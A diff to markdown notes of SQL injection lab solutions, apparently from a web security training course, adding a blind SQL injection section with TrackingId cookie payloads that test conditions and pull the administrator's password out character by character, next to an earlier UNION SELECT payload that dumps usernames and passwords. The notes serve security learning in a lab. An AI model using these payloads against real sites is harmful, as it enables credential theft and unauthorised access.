@@ -110,12 +110,21 @@ Or
 '+UNION+SELECT+NULL,username||password+FROM+users--
 ```
 
+### Lab11: Blind SQL injection with conditional responses
+```sh
+TrackingId=xyz' AND '1'='1
+```
+```sh
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+```sh
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
 
+```
 
-
-
-
-
+```sh    
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
 
 
 
